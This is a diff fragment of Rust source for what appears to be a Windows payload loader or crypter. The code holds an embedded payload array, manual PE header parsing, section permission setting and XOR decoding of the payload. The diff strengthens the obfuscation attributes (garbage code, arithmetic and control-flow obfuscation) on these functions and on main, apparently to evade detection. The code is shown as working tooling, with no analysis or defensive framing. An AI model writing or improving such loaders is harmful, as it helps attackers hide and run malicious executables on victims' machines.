@@ -114,7 +114,7 @@ const PAYLOAD: &[u8] = &[
     //payload here
 ];
 #[cfg(windows)]
-#[obfuscate(garbage = true, len = 12)]
+#[obfuscate(garbage = true, arithmetic = true, fonk_len = 12)]
 fn split_and_save_payload(data: &[u8]) -> Result<(), String> {
     use std::fs::File;
     use std::io::Write;
@@ -150,7 +150,7 @@ fn split_and_save_payload(data: &[u8]) -> Result<(), String> {
 }
 
 #[cfg(windows)]
-#[obfuscate(garbage = true, len = 12)]
+#[obfuscate(garbage = true, arithmetic = true, fonk_len = 12)]
 unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) -> *const ImageDataDirectory {
     let optional_header_ptr = &(*nt_headers).optional_header as *const ImageOptionalHeader64;
     let data_dir_ptr = (optional_header_ptr as usize + mem::offset_of!(ImageOptionalHeader64, number_of_rva_and_sizes) + mem::size_of::<u32>()) as *const ImageDataDirectory;
@@ -158,7 +158,7 @@ unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) 
 }
 
 #[cfg(windows)]
-#[obfuscate(garbage = true, len = 12)]
+#[obfuscate(garbage = true, arithmetic = true, fonk_len = 12)]
 unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHeader) -> Result<(), String> {
     let characteristics = section.characteristics;
     let mut protect = PAGE_READONLY;
@@ -397,7 +397,7 @@ fn transform_data(data: &[u8], key: &[u8]) -> Vec<u8> {
     data.iter().enumerate().map(|(i, byte)| byte ^ key[i % key.len()]).collect()
 }
 
-#[obfuscate(main = true, garbage = true, control_f = true)]
+#[obfuscate(main = true, garbage = true, control_f = true, arithmetic = true)]
 fn main() {
     #[cfg(windows)]
     {
